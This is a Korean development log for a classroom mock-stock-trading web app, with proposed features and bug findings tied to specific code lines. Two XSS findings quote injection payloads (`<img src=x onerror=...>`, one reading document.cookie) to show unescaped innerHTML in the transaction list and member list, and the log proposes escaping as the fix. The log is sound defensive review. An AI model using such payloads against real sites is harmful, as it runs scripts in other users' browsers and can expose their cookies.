# 모의주식게임 일일 분석 노트

---

## 2026-08-08

### 추가하면 좋을 기능

- **시장 탭 섹터 필터 버튼에 섹터 평균 변동률 뱃지 표시** (`app.js:1243-1248`, `renderSectors()`): 현재 섹터 필터 버튼(`renderSectors()`)은 섹터명만 표시함. `S.stocks`는 이미 클라이언트에 모두 내려와 있으므로, 서버 변경 없이 `const sectorAvg = (s) => { const ss = S.stocks.filter(x => x.sector===s); return ss.length ? ss.reduce((a,x)=>a+x.change_pct,0)/ss.length : 0; }` 를 계산해 `<button ... >${s} <span class="${sectorAvg(s)>=0?'chip-up':'chip-down'}" style="font-size:10px">${sectorAvg(s)>=0?'+':''}${sectorAvg(s).toFixed(1)}%</span></button>` 형태로 렌더링하면 됨. 학생들이 "반도체 +3.2%" 처럼 섹터 강/약세를 한눈에 파악해 섹터 로테이션 전략 교육에 즉각 활용 가능. `loadMarket()` 호출마다 `renderSectors()`가 실행되므로 자동 갱신.

- **보유 종목 목표가 알림 기능 (`localStorage` 기반)** (`app.js:1311-1323`, `renderGrid()` 또는 10초 폴링 루프): 학생이 특정 종목의 목표 가격을 설정하면 가격 도달 시 토스트 알림을 표시하는 기능. `let _priceAlerts = JSON.parse(localStorage.getItem('priceAlerts') || '{}')` 로 `{symbol: targetPrice}` 딕셔너리를 유지하고, `renderGrid()` 내 또는 10초 폴링 루프(`app.js:648`)에서 `S.stocks.forEach(st => { if (_priceAlerts[st.symbol] && st.price >= _priceAlerts[st.symbol]) { toast(\`⭐ ${st.name} 목표가 ${krw(_priceAlerts[st.symbol])} 도달!\`, 'success'); delete _priceAlerts[st.symbol]; } })` 를 추가. 주식 모달에 "목표가 설정" 입력창을 추가. 서버 변경 불필요, 약 20줄 구현. "언제 팔아야 하나?" 판단 타이밍 교육에 직결.

- **학생용 거래 내역 CSV 내보내기** (`app.py:829-847`, `get_transactions()`, `app.js` 결과/포트폴리오 화면): 게임 종료 후 진행자만 Excel을 다운로드할 수 있고 학생 개인의 전체 거래 기록을 보존할 방법이 없음. `GET /api/rooms/<rid>/transactions/export` (또는 기존 `?export=csv` 파라미터 추가)를 신규 추가해 `RoomTransaction` 전체를 CSV(`timestamp,symbol,action,shares,price,amount,note`)로 반환. Flask의 `Response(csv_string, mimetype='text/csv', headers={'Content-Disposition':'attachment;filename=...'})` 패턴으로 30줄 구현. 포트폴리오 탭 또는 결과 화면에 "📥 내 거래 기록 저장" 버튼 추가로 완성. 학생이 수업 후 분석 자료 보유 가능.

- **진행자 "특정 종목 거래 차단" 기능** (`app.py:724-767`, `trade()`, 진행자 설정 탭): 수업 중 특정 종목이 극단적 가격 이동을 보이거나 상장폐지 시뮬레이션을 하고 싶을 때 해당 종목만 매매를 막을 기능이 없음. `_banned_symbols: dict = {}  # rid -> set` in-memory 딕셔너리를 추가하고 `POST /api/rooms/<rid>/host/ban-symbol`로 set에 추가, `trade()`에서 `if symbol in _banned_symbols.get(rid, set()): return jsonify({'error': '해당 종목은 거래가 제한되었습니다.'}), 400` 체크 추가. 진행자 시장 탭의 종목별 제어 버튼에 "거래 차단/해제" 토글 추가. 서버 약 15줄 + 클라이언트 버튼 하나. "상장폐지", "거래 정지" 개념 실습에 활용 가능.

- **포트폴리오 집중도 경고 표시 (단순 HHI 계산)** (`app.py:772-803`, `get_portfolio()`, `app.js:1456-1566`, `loadPortfolio()`): 현재 포트폴리오 탭은 보유 종목 목록만 표시하고 집중도 리스크에 대한 피드백이 없음. 서버 응답에는 이미 `holdings[].current_value`와 `total_value`가 있으므로, 클라이언트에서 `hhi = holdings.reduce((s,h) => s + (h.current_value/total_value)**2, 0)`를 계산해 `hhi > 0.5` 이면 "⚠️ 집중 투자 위험 — 단일 종목 비중 과다" 배너를 포트폴리오 상단에 표시. `app.js:1542` 이후 holdings 렌더링 직전에 약 5줄 추가. 분산 투자 개념을 실시간 피드백으로 가르칠 수 있어 교육 효과 직결.

- **복권 라운드별 당첨 번호 히스토리 표시 (진행자 복권 모달)** (`app.py:1114-1147`, `get_lottery()`, 진행자 복권 UI): 복권이 `revealed` 상태가 되면 `cur['results']`와 `cur['winning']`이 이미 메모리에 있으나, 다음 라운드 시작 시 `lot['current']`가 교체되어 이전 당첨 번호를 볼 방법이 없음. `_lots[rid]`에 `'history': [{'round': n, 'winning': [...], 'top_prize_uid': uid}]` 리스트를 추가해 `_do_reveal()` 완료 시 기록하고, `get_lottery()` 호스트 응답에 `'history': _lots[rid].get('history', [])` 필드를 포함. 진행자 복권 모달 하단에 "이전 회차" 섹션으로 표시하면 "1회차 당첨번호: 3, 12, 17, 25, 38, 41" 처럼 통계 수업에 활용 가능. `_do_reveal()` 약 3줄, `get_lottery()` 1줄 추가.

### 제거/단순화할 것들

- **`txn-list`·`stxn-list` 렌더링에서 `t.note` innerHTML 직접 삽입 — XSS 취약점** (`app.js:526`, `app.js:1581`): `loadStudentTxn()`(`app.js:526`)과 `loadTxn()`(`app.js:1581`) 양쪽에서 `<div ...>${t.timestamp}${t.note ? ' · ' + t.note : ''}</div>` 형태로 `t.note`가 innerHTML에 직접 삽입됨. `t.note`는 `host_adjust()`에서 진행자가 임의 입력하는 값(`app.py:596`: `note = d.get('note', '진행자 자산 조정')`)이며 서버에서 아무 검증 없이 DB에 저장됨. 악의적인 진행자가 `note="<img src=x onerror=alert(document.cookie)>"` 를 입력하면 모든 학생의 거래 내역 탭에서 스크립트가 실행됨. 이미 `escHtml()` 함수(`app.js:897`)가 존재하므로 두 줄을 `${escHtml(t.note ? ' · ' + t.note : '')}` 형태로 교체하면 해결. `app.py:596`에서 `note = d.get('note','').strip()[:200]` 길이 제한 추가도 권장.

- **`submit_quiz()` 오답 패널티 청산 시 `int()` 버림으로 shortfall 미해소 가능** (`app.py:1320`): `shares_to_sell = max(1, int(shortfall / price))` 에서 `int()` 버림으로 `actual = price * shares_to_sell < shortfall`이 되는 경우가 발생. 예: shortfall=9,999원, price=5,000원이면 shares_to_sell=1, actual=5,000원 → shortfall 4,999원 미해소. 이미 `minigame_spin()`(`app.py:1040`)에서 동일 버그가 2026-07-30 항목에 지적됐으나 `submit_quiz()`의 `app.py:1320`은 별도로 존재하는 같은 버그. `math.ceil(shortfall / price)`로 교체하거나, 청산 후에도 `shortfall > 0`이면 그 잔여분을 현금(`m.cash`)에서 추가 차감(`m.cash = max(0, m.cash - shortfall)`)하는 방어 로직 추가 필요.

- **`get_chart()`·`get_room_news()` 방 멤버 검증 없음** (`app.py:710-719`, `app.py:703-707`): `get_stocks()`(2026-07-17에 지적)와 같은 패턴으로, `get_chart()`는 `Room.query.get_or_404(rid)`만 수행하고 요청자가 해당 방 멤버인지 확인하지 않음(`app.py:713`). `get_room_news()`도 동일(`app.py:706`). 로그인된 임의 사용자가 다른 방의 종목 차트 데이터와 뉴스를 조회할 수 있어 대회/시험 상황에서 스파이 가능. 두 함수 모두 `get_portfolio()`(`app.py:777-778`)와 동일한 패턴으로 `member = RoomMember.query.filter_by(room_id=rid, user_id=user.id).first(); if not member: return jsonify({'error':'참여자가 아닙니다.'}), 403` 를 각각 추가하면 해결 (단, `get_chart()`는 호스트 진행자도 접근 가능해야 하므로 `room.host_id == user.id` 도 허용).

- **`room_dict()` 내 `_lot_round_due()` 호출이 전역 `_lots[rid]` 초기화 사이드 이펙트 유발** (`app.py:300`, `app.py:175-178`): `room_dict()`는 순수 직렬화 함수처럼 보이지만, `app.py:300`의 `_lot_round_due(room, remaining, total_s)` 호출이 내부적으로 `if rid not in _lots: _lots[rid] = {'done': done_set, 'current': None}` (`app.py:175-178`)을 실행해 전역 `_lots` 딕셔너리를 변경함. `get_room()` → `_get_room_cached(room, uid)` → `room_dict()` 경로로 캐시 히트 시에도 간접 호출될 수 있고, 테스트나 로깅 목적으로 `room_dict()`를 호출하면 예상치 못한 상태 변경이 발생함. `_lot_round_due()` 내 초기화 로직을 `get_room()` 라우트 내부 또는 `_auto_start_lottery_if_due()` 진입부로 이동해 `room_dict()`를 순수 함수로 유지할 것을 권장.

- **`loadPortfolio()` 에서 `portChart`·`assetLineChart` 매번 destroy-재생성** (`app.js:1486`, `app.js:1509`): `S.portChart`와 `S.assetLineChart`를 매 `loadPortfolio()` 호출 시 `destroy()` 후 `new Chart()`로 재생성함. 진행자 `renderHostBarChart()`는 2026-06-11에 이미 update 패턴으로 개선했으나 포트폴리오 차트 두 개는 그대로임. 포트폴리오 탭 진입 때마다 (10초 폴링 루프 포함 시) 차트가 깜빡이고 DOM 재계산 비용 발생. `if (S.portChart) { S.portChart.data.datasets[0].data = values; S.portChart.data.labels = labels; S.portChart.update(); } else { S.portChart = new Chart(...) }` 패턴으로 교체하고, `assetLineChart`도 동일하게 처리하면 포트폴리오 탭이 부드럽게 갱신됨.

- **거래 내역에서 `RLT` 액션이 '조정'으로 표시되어 학생 혼동** (`app.js:529`, `app.js:1584`): `loadStudentTxn()`과 `loadTxn()` 양쪽에서 뱃지를 `t.action==='BUY'?'매수':t.action==='SELL'?'매도':'조정'` 삼항 연산자로 처리함. `RLT`(룰렛), `ADJ`(자산조정) 모두 `'조정'`으로 표시되어 룰렛으로 잃은 금액과 진행자 보정이 동일하게 보임. `const ACTION_LABELS = {BUY:'매수',SELL:'매도',RLT:'룰렛',ADJ:'조정'}; const badge = ACTION_LABELS[t.action] || t.action;` 로 교체하고 CSS에 `.txn-badge.rlt { background: var(--warn) }` 색상을 추가하면 룰렛·복권(`ADJ` with note 포함)·조정이 시각적으로 구분됨. `app.js:529`와 `app.js:1584` 두 곳 수정.

- **`lottery_pick()` 에서 `cur['picks']` 딕셔너리 락 없이 동시 수정** (`app.py:1170`): `cur['picks'][str(user.id)] = nums` 할당이 `_lottery_lock` 밖에서 수행됨. 같은 학생이 두 탭에서 거의 동시에 POST를 보내면 두 요청이 병렬로 `cur['picks']`를 수정해 경합 조건이 발생할 수 있음. Python GIL이 dict 단건 쓰기에서 원자성을 보장하지만, `get_lottery()` 내 `_lottery_lock` 블록의 전체 멤버 제출 체크(`eligible > 0 and len(cur['picks']) >= eligible`)가 picks 수정과 동기화되지 않아 "모든 참여자 제출 → 즉시 drawing 전환" 분기가 중복 트리거될 수 있음. `app.py:1170` 할당을 `with _lottery_lock: cur['picks'][str(user.id)] = nums` 블록으로 이동하고, 아래 `app.py:1178`의 `with _lottery_lock` 을 기존 락으로 합치면 전체 원자성 보장.

---

## 2026-07-30

### 추가하면 좋을 기능

- **포트폴리오 탭 실시간 자동 갱신** (`app.js:613-651`, `showPage()` / `enterParticipantGame()` 폴링 루프): 현재 포트폴리오 탭은 `showPage('portfolio')` 호출 시 한 번만 `loadPortfolio()`를 실행하고 이후 갱신이 없음. 10초 폴링 루프(`app.js:648-649`)에 `if (S.currentPage === 'market')`, `if (S.currentPage === 'rankings')` 분기는 있지만 `portfolio`는 빠져 있어, 탭을 열어 둔 채 가격이 변해도 보유 종목 평가액이 그대로임. `if (S.currentPage === 'portfolio') loadPortfolio();` 한 줄을 `app.js:649` 바로 다음에 추가하면 서버 변경 없이 보유 주식 실시간 평가가 가능해짐. 다른 탭들과 일관된 UX 제공.

- **진행자 공지 브로드캐스트 기능** (`app.py` 신규 `POST /api/rooms/<rid>/host/announce`, 진행자 설정 탭): 진행자가 수업 중 모든 학생에게 텍스트 메시지를 전달할 방법이 없음. `_notices: dict = {}  # room_id -> {text: str, ts: float}` in-memory 딕셔너리를 추가하고, `POST /api/rooms/<rid>/host/announce` 에서 `_notices[rid] = {'text': text, 'ts': time.time()}`로 저장한 뒤, 참여자 폴링 응답(`get_room()`)에 `notice`를 포함시키면 됨. 프론트에서 `r.notice`가 이전 `ts`와 다르면 토스트 또는 고정 배너로 표시. 서버 약 15줄, 클라이언트 `<input>` + `<button>` 추가. "지금부터 반도체 섹터 설명합니다!" 같은 수업 연계 공지 전달 가능.

- **순위 변동 화살표 실시간 표시** (`app.js:loadParticipantRankings()`, `app.py:808-824`, `get_rankings()`): 현재 순위판은 현재 순위만 표시하고 이전 순위 대비 변동(▲2, ▼1, ─)이 없음. 클라이언트 측에서 `let _prevRanks = {}` 로 이전 순위를 캐시하고, `loadParticipantRankings()` 렌더링 시 `_prevRanks[e.user_id]`와 비교해 `▲${prev-cur}`, `▼${cur-prev}`, `─`로 변동을 표시한 뒤 `_prevRanks`를 갱신하면 됨. 서버 변경 없이 약 10줄로 구현 가능. 순위가 오르면 녹색 화살표, 내리면 빨간 화살표로 게임 긴장감이 크게 높아짐.

- **퀴즈 오답 이력 및 복습 노트** (`app.py:1270-1342`, `submit_quiz()`, `app.js:870-890`, `submitQuiz()`): 현재 퀴즈 오답 해설(`data.explanation`)은 창 닫힘과 동시에 사라지고 재확인 방법이 없음. `submit_quiz()` 에서 `RoomTransaction(action='QUIZ', note=f"{'O' if correct else 'X'}: {q['q'][:80]}")` 로 응답 이력을 기록하고(`app.py:1339` 직전 추가), 거래 내역 탭에서 `action='QUIZ'` 필터로 조회하거나 별도 "내 퀴즈 기록" 섹션을 교육 탭에 추가하면 됨. 게임 종료 후 "틀린 문제 다시 보기"가 가능해 교육 효과 직결.

- **섹터 이벤트 예고 카운트다운** (`app.py:1345-1360`, `host_market_event()`, 진행자 UI): 현재 섹터 이벤트(`force_sector_event()`)는 즉시 적용됨. `countdown_seconds` 파라미터를 추가해 진행자가 "3초 후 IT 섹터 급락!" 예고를 먼저 보낸 뒤 실제 이벤트가 발생하도록 하면 학생들이 실시간 판단을 연습할 수 있음. `threading.Timer(countdown, lambda: get_room_service(rid).force_sector_event(sector, pct))`로 약 5줄 구현. `countdown <= 0`이면 즉시 적용하는 기존 동작 유지. 뉴스 캐시 무효화와 연계해 카운트다운 도중 "⚠️ N초 후 이벤트 예정" 뉴스를 먼저 발송하면 교육 효과 극대화.

- **진행자 게임 중 포트폴리오 스냅샷 기록** (`app.py` 신규 `POST /api/rooms/<rid>/host/snapshot`, `RoomTransaction` 활용): 진행자가 게임 중간에 "지금 모든 학생 자산 기록" 버튼을 누르면 전 멤버의 `total_value`와 `holdings` 요약을 `{label, members: [{uid, total_value, top_sector}]}` 형태로 in-memory `_snapshots[rid] = []` 에 추가. 게임 종료 후 결과 화면에서 "1차 스냅샷 vs 최종" 비교 차트를 보여주면 투자 결정의 시계열 학습이 가능. 서버 20줄, 클라이언트 버튼 하나 추가. 엑셀 내보내기에 스냅샷 시트를 추가하면 더욱 가치 있음.

### 제거/단순화할 것들

- **`api.get/post()` 에서 `r.json()` 파싱 실패 시 unhandled Promise rejection으로 UI 침묵 실패** (`app.js:31,36`): `api.get/post`는 서버가 HTML 오류 페이지를 반환해도 `r.ok` 검사 없이 `return r.json()`을 호출함. 실제로 `r.ok`가 `false`일 때도 `return {error: ...}`를 반환하지만, `r.json()` 자체가 JSON이 아닌 응답에서 `SyntaxError`를 던지면 try-catch가 없어 호출 스택 전체가 unhandled rejection으로 처리되고 `if (data.error)` 체크가 수행되지 않은 채 조용히 실패함. `return r.json().catch(() => ({error: 'parse error'}))` 로 교체하면 Flask 500 오류 HTML 응답에서도 안전하게 에러 메시지가 반환됨 (`app.js:31`, `36` 두 줄만 수정).

- **`minigame_spin()` shortfall 조달 시 정수 버림으로 `m.cash` 음수 가능** (`app.py:1040-1044`): `shares_to_sell = max(1, int(shortfall / price))` 계산에서 `int()` 버림으로 `actual_value = price * shares_to_sell < shortfall` 인 경우가 발생. 예: shortfall=1,000원, price=700원이면 shares_to_sell=1, actual_value=700원으로 300원 미달. 이후 `m.cash = m.cash - bet + winnings`에서 `m.cash`가 음수가 될 수 있음. `shares_to_sell = math.ceil(shortfall / price)` 로 바꾸거나, 실제 조달된 금액이 shortfall보다 부족하면 shortfall을 실제 보유액으로 재조정하는 로직(`shortfall = max(0, shortfall - actual_value)`) 추가가 필요함. `import math`를 `app.py` 상단에 추가하면 됨.

- **`showBombNews()` 에서 서버 headline이 innerHTML에 비이스케이프 삽입 — XSS 잠재 위험** (`app.js:1159,1163`): `<div class="bomb-news-headline">${item.headline}</div>` 와 `<div class="bomb-news-headline ${cls}">${arrow} ${item.headline}</div>` 에서 `item.headline`이 직접 innerHTML에 삽입됨. `StockService._generate_news()`가 하드코딩된 템플릿을 사용해 현재는 위험이 낮지만, 향후 진행자 커스텀 뉴스 기능(2026-07-18 제안)이 추가되면 사용자 입력이 그대로 노출됨. `escHtml()` 함수(`app.js:897`)가 이미 존재하므로 `${escHtml(item.headline)}`으로 교체하는 두 줄 수정으로 방어 가능.

- **`_next_price()` ±40% 클램핑이 `force_price()` ±70%와 불일치하여 강제 상승 직후 자동 급락** (`stock_service.py:138-139,224-225`): `_next_price()`는 `max(base * 0.6, min(base * 1.4, new_price))`로 base 대비 ±40% 범위를 강제하는데, `force_price()`는 `max(base * 0.3, min(base * 3.0, new_price))`로 ±70%(하한 70%)까지 허용. 진행자가 `force_price('+40%')`로 가격을 base * 1.4에 올려놓아도 다음 `get_price()` 호출에서 `_next_price()`가 다시 `max(base * 0.6, ...)` 클램핑을 적용해 즉시 내려갈 수 있음. `_next_price()` 클램핑도 `base * 0.3 ~ base * 3.0`으로 `force_price()`와 일치시키면 강제 이벤트의 지속성이 확보됨 (`stock_service.py:139` 한 줄 수정).

- **`enterParticipantGame()` 재진입 시 `S.depCash` 미초기화로 예금 탭 현금 오표시** (`app.js:590-598`): `enterParticipantGame()` 에서 `S.depRate = S.room.deposit_rate`를 설정하지만 `S.depCash`는 초기화하지 않음. 학생이 게임 도중 페이지를 새로고침해 재진입하면 이전 세션의 `S.depCash` 값이 남아 예금 탭의 "보유 현금" 표시가 잘못될 수 있음. `S.depCash = 0;` 한 줄을 `app.js:597` 직후에 추가하면 `loadDepositsPage()` 최초 호출이 올바른 초기 상태에서 시작됨.

- **`force_sector_event()` 에서 `self._prev` 미업데이트로 섹터 이벤트 후 change_pct 누적 오류** (`stock_service.py:244-276`): `force_sector_event()`가 `self._prices[sym] = (time.time(), new_price)`로 현재가를 갱신하지만 `self._prev[sym]`은 게임 시작 시 설정한 초기가를 그대로 유지. 결과적으로 섹터 이벤트 직후 `change_pct`는 "방금 전 대비"가 아닌 "게임 시작 이후 누적 변동률"을 표시해, +30% 섹터 이벤트 발동 후 이미 +30%였다면 UI에서 +60%로 표시됨. `stock_service.py:253` 직후에 `self._prev[sym] = price  # 이벤트 전 가격을 prev로 설정` 추가하면 이벤트 기준 변동률이 정확해짐.

- **서버 재시작 후 `_rlt_active[rid] = {'count': 0}` 복구로 첫 `minigame_close()` 호출 시 즉시 게임 종료** (`app.py:467-468`): `get_room()` 에서 `rlt_triggered=True`인 방이 재시작 후 처음 폴링되면 `_rlt_active[rid] = {'count': 0, 'auto_paused': True}`로 초기화. 그러나 재시작 전에 룰렛을 열고 있던 학생들이 `minigame_close()` 를 호출하면 `state['count'] = max(0, 0 - 1) = 0`이 되어 `count == 0 and auto_paused` 조건이 만족되면서 예기치 않게 게임이 종료됨. 복구 시 `count`는 현재 열린 룰렛 오버레이를 알 수 없으므로 `auto_paused: True` 대신 `auto_paused: False`로 초기화하고, `rlt_triggered=True` 상태에서 `minigame_close()`의 종료 분기를 별도 DB 조회로 판단하는 것이 안전함 (`app.py:467`).

---

## 2026-07-18

### 추가하면 좋을 기능

- **진행자에서 학생별 포트폴리오 열람 기능** (`app.py:542-561`, `app.js:408-431`): 현재 진행자는 학생의 총 자산·수익률만 볼 수 있고 어떤 종목을 얼마나 보유하는지 알 수 없음. `GET /api/rooms/<rid>/host/members/<uid>/portfolio` 엔드포인트를 추가하고, 진행자 멤버 목록의 "거래" 버튼 옆에 "포트폴리오" 버튼을 추가하면 "이 학생은 왜 이런 수익률이 나왔을까?" 즉각적인 교육 개입이 가능. 기존 `get_portfolio()` 로직(`app.py:772-803`)을 공통 함수로 추출해 host용 엔드포인트에서 재사용 가능.

- **주식 모달에 보유 종목의 개인 수익률 표시** (`app.js:1344-1356`, `openStockModal()`): 모달에 시장 기준 `change_pct`만 있고, 내가 산 평균가 대비 현재 손익이 표시되지 않음. `port.holdings`에서 이미 `avg_price`, `gain_pct`를 받아오므로 `app.js:1350` 직후에 보유 중인 경우 "내 수익: +5.2% (+120,000원)" 한 줄 추가로 구현. 실제 증권 앱과 유사해져 매수·매도 판단 근거를 직관적으로 제공.

- **진행자 커스텀 뉴스 헤드라인 직접 입력** (`app.py:690-701`, `host_send_news()`): "폭탄뉴스 발송"이 미리 정의된 템플릿에서 랜덤 선택되어 수업 내용과 연계하기 어려움. `d.get('custom_headline')`을 받아 `items = [{'headline': custom_headline, 'direction': d.get('direction', 'up')}]`로 override하면 교사가 "삼성전자 AI 칩 수출 규제 발표!"처럼 실제 시사를 반영한 이벤트를 만들 수 있음. 서버 5줄, 클라이언트 `<input>` + `<select>` 추가로 구현 가능.

- **복권 당첨 결과 진행자 발표 모드** (`app.py:1141-1147`, `get_lottery()`): 복권 `revealed` 상태에서 `all_results`가 반환되지만 진행자 모달에 당첨자가 시각적으로 강조 표시되지 않음. 당첨자 상위 3명을 큰 폰트로 표시하고 6개 일치(잭팟)가 있으면 confetti 효과를 추가하면 수업 하이라이트로 활용 가능. `_lots[rid]['current']['results']` 데이터를 이미 프론트에 반환하므로 서버 변경 없이 `app.js` 복권 모달 UI 수정만으로 구현 가능.

- **거래 내역에서 종목별 필터 기능** (`app.py:829-847`, `get_transactions()`, `app.js:1569-1593`, `loadTxn()`): 현재 전체 거래 내역을 시간 역순으로만 제공. URL 파라미터 `?symbol=SMSNG`를 추가해 `app.py:836`에 `if sym_filter: q = q.filter(RoomTransaction.symbol == sym_filter)` 한 줄 추가하고, 포트폴리오 보유 종목 카드에 "내역" 버튼을 추가하면 종목별 매매 전략 분석 교육에 활용 가능. `app.js:1558-1560`의 보유 종목 버튼 그룹에 "📋 내역" 버튼 추가로 UI 완성.

- **게임 시작 전 학생 "준비 완료" 투표** (`app.py:475-488`, `start_room()`, `app.js:enterParticipantLobby()`): 진행자가 시작 버튼을 누르면 즉시 게임이 시작되어 로딩 중인 학생이 첫 10~20초를 놓칠 수 있음. `RoomMember`에 `is_ready = db.Column(db.Boolean, default=False)` 컬럼을 추가하고, 로비에서 학생이 "준비!" 버튼을 누르면 진행자 로비에 "N/M명 준비 완료"로 실시간 반영. `lobby_members()` 응답에 `is_ready` 필드 추가, 클라이언트 버튼 하나로 구현 가능. 시작 조건은 진행자 재량이므로 게임 흐름 변경 없음.

### 제거/단순화할 것들

- **`lottery_draw()` Lock 없이 `_do_reveal()` 직접 호출 — 이중 상금 지급 위험** (`app.py:1206`): `lottery_draw()`가 `_lottery_lock` 없이 `_do_reveal(rid, cur)`을 직접 호출함. `get_lottery()`는 `app.py:1123`에서 동일 함수를 `_lottery_lock` 내에서 자동 호출. 드로우 마감시간(`draw_dl`)이 정확히 지나는 순간 진행자가 직접 추첨을 누르면 두 요청이 `_do_reveal()`을 중복 실행해 당첨자 전원에게 상금이 두 번 지급될 수 있음. `app.py:1203-1206`을 `with _lottery_lock: if cur.get('state') != 'revealed': _do_reveal(rid, cur)` 패턴으로 감싸야 함.

- **`host_adjust()` delta 금액 범위 미검증** (`app.py:595-596`): `delta = float(d.get('delta', 0))`에 상한/하한 검증이 없어 입력 실수 또는 API 직접 호출로 수십억 원을 한 번에 지급하거나 거액을 차감할 수 있음. `m.cash = max(0, m.cash + delta)` 덕분에 현금이 음수로 내려가지는 않지만 비정상적으로 큰 금액을 막을 수단이 없음. `app.py:597` 직후에 `if abs(delta) > room.starting_cash * 5: return jsonify({'error': '조정 금액이 너무 큽니다'}), 400`를 추가하면 수업 중 실수 방지.

- **`get_rankings()` / `host_members()` N+1 쿼리로 과도한 DB 부하** (`app.py:815-823`, `app.py:548-558`): 멤버 수만큼 `member_total_value()`를 반복 호출하며, 각 호출은 `RoomHolding.query.filter_by(room_id=rid, user_id=uid)` + `Deposit.query.filter_by(room_id=rid, user_id=uid)` 2회 DB 쿼리를 발생. 학생 30명 방에서 GET /rankings + GET /host/members 합산 10초마다 최소 120회 DB 쿼리 발생. `RoomHolding.query.filter_by(room_id=rid).all()`과 `Deposit.query.filter_by(room_id=rid, status='active').all()`로 전체 일괄 조회 후 메모리에서 uid별 집계하면 2 쿼리로 줄일 수 있음.

- **`loadDepositsPage()` 만기·해지 예금 숨겨 이자 학습 효과 저하** (`app.js:1629`): `const active = (data || []).filter(d => d.status === 'active')`로 활성 예금만 표시해, 게임 종료 후 만기된 예금이나 게임 중 해지한 예금의 이자 내역을 확인할 수 없음. 서버 `get_deposits()`는 이미 모든 상태를 반환하므로 클라이언트만 수정하면 됨. `app.js:1629-1643` 렌더링 로직을 활성·만기·해지 세 섹션으로 나누면 "해지했을 때와 만기 때 이자가 얼마 달랐나?" 직접 비교 교육이 가능.

- **`trade()` 응답에 체결 가격 누락 — 슬리피지 불투명** (`app.py:766`): `return jsonify({'message': ..., 'cash': member.cash})`에 `price`가 없음. `PRICE_TTL=20초` 이내에서도 가격이 갱신될 수 있어 모달 표시 가격과 실제 체결 가격이 다를 수 있으나 학생이 인지할 방법이 없음. `app.py:766` 응답에 `'price': price`를 추가하고, `app.js:1435-1436` `execTrade()` 성공 핸들러에서 체결가를 표시하면 시장가 매매의 가격 불확실성 개념 교육에 활용 가능.

- **`get_quiz()` 방 멤버 여부 미확인 — 타 방 문제 미리 열람 가능** (`app.py:1248-1268`): `@login_required`와 `room.status != 'active'` 체크만 있고 `RoomMember` 검증이 없음. 로그인된 사용자가 임의 `rid`로 `GET /api/rooms/{rid}/quiz`를 호출해 다른 방의 퀴즈 문제를 미리 확인 가능. `get_portfolio()` (`app.py:775-778`)와 동일한 패턴으로 `app.py:1255` 직후에 `member = RoomMember.query.filter_by(room_id=rid, user_id=user.id).first(); if not member: return jsonify({'error': '참여자가 아닙니다.'}), 403`를 추가해야 함.

---

## 2026-07-17 (2차)

### 추가하면 좋을 기능

- **QR 코드 `?code=` 파라미터 자동 입력 처리** (`app.js:194-198`, `window.onload`): QR 코드가 `?code=XXXXXX` URL을 인코딩하지만 랜딩 페이지의 `window.onload`가 URL 파라미터를 읽지 않아 학생이 수동으로 방 코드를 다시 입력해야 함. `window.onload` 진입 시 `new URLSearchParams(location.search).get('code')`로 값을 읽어 joinCode input에 자동 채우고 바로 `joinRoom()`을 호출하면 QR 스캔 → 자동 입장으로 UX가 크게 개선됨.

- **퀴즈 문제별 정답률 집계 및 진행자 표시** (`app.py:1245`, `_quiz_state`): 현재 퀴즈 결과는 누가 맞췄는지는 알 수 있지만 어떤 문제에서 많이 틀렸는지 집계가 없음. `_quiz_state[rid]`에 `per_question_results: {q_idx: {correct: int, wrong: int}}` 키를 추가해 퀴즈 종료 후 진행자 화면에 "3번 문제 정답률 23%" 식의 교수법적 피드백을 제공하면 수업 개선에 활용 가능.

- **"거래 동결" 모드 (타이머 유지, 주가만 고정)** (`app.py:490-501`, `pause_room()`): 현재 일시정지는 타이머까지 멈춰 실질적으로 게임이 중단됨. 진행자가 설명을 하는 동안 주가 변동만 막고 타이머는 계속 흐르게 하는 `freeze_trading` 상태를 별도로 추가하면 수업 흐름을 끊지 않고 시장을 안정시킬 수 있음. `Room.status` 또는 별도 in-memory 플래그로 구현 가능.

- **종목별 일중 최고/최저가 표시** (`app.py:658-671`, `get_stocks()`): 현재 응답이 `price`와 `change_pct`만 반환함. `StockService`에 `_high: dict`, `_low: dict`를 추가해 세션 중 기록된 고/저가를 함께 반환하면, 학생이 "지금이 오늘 최고가인가?" 판단을 내릴 수 있어 투자 전략 교육에 유용.

- **호스트 게임 통계 요약 카드** (`app.py:542-561`, `host_members()`): 총 거래 건수, 가장 활발한 학생, 가장 많이 거래된 종목을 `/api/room/<rid>/stats` 별도 엔드포인트로 제공하고 호스트 대시보드 상단에 카드로 표시하면, 진행자가 게임 중 학생 참여도를 한눈에 파악할 수 있음. `RoomTransaction` 테이블 집계 쿼리로 구현 가능.

- **수익률 마일스톤 달성 시 시각적 축하 효과** (`app.js:735-752`, `refreshMyRank()`): `refreshMyRank()`가 매 폴링마다 총자산을 갱신하지만 특정 수익률(+50%, +100%)을 처음 달성할 때 특별한 피드백이 없음. 로컬 `_milestones` Set을 유지해 처음 임계값을 넘는 순간 confetti 또는 토스트 알림을 표시하면 게임적 동기 부여 효과를 높일 수 있음.

### 제거/단순화할 것들

- **`m.username` innerHTML 직접 삽입으로 XSS 취약점** (`app.js:223`, `app.js:417,425`): `loadLobbyMembers()`(223줄)와 `loadHostMembers()`(417줄)가 `${m.username}`을 innerHTML에 그대로 삽입함. `escHtml()` 함수(`app.js:897`)가 이미 정의되어 있지만 username에는 호출되지 않음. 학생이 `<img src=x onerror=alert(1)>` 형태의 이름으로 가입하면 진행자 브라우저에서 임의 JS를 실행할 수 있음. 모든 `${m.username}` 삽입을 `${escHtml(m.username)}`으로 교체해야 함.

- **`host_market_event()` 후 뉴스 캐시 무효화 누락** (`app.py:1357`): `force_sector_event()`가 `self._news`를 업데이트하지만 앱 레벨 `_news_cache`(2초 TTL)가 무효화되지 않음. 진행자가 섹터 이벤트를 발동해도 참여자는 최대 2초간 구 뉴스를 수신함. `host_force_price()`에는 1351줄에서 `_invalidate_news_cache(rid)`를 호출하는 기존 패턴이 있으므로, 1357줄 `svc.force_sector_event()` 직후에도 동일하게 호출해야 함.

- **`create_room()` 숫자 파라미터 파싱 예외 처리 누락** (`app.py:384-386`): `int(d.get('duration_minutes', 30))`와 `float(d.get('starting_cash', ...))` 변환에 try-except가 없어 비숫자 입력 시 ValueError → 500 HTML 반환. `trade()` 등 다른 엔드포인트가 사용하는 패턴처럼 try-except로 감싸고 `{"error": "invalid parameter"}` + 400을 반환해야 함.

